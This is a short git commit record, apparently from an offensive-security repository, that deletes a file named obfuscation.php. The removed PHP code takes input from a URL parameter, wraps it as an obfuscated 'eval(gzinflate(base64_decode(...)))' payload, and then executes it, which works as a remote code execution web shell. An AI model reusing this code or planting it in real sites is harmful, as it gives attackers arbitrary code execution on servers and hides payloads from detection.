a41fdf26fdf1d2a10733ac1d8cc6e8f11057e4d7
Rodolfo Mariano <rodolfomarianocy@gmail.com>
2022-06-03 18:13:16 -0300

    Delete obfuscation.php

--- obfuscation.php
+++
@@ -1,6 +0,0 @@
-<?php
-	$input = $_GET['code'];
-	$result = (base64_encode(gzdeflate($input)));
-	echo "payload: eval(gzinflate(base64_decode('$result')))" ;
-	eval(gzinflate(base64_decode($result)));
-?>
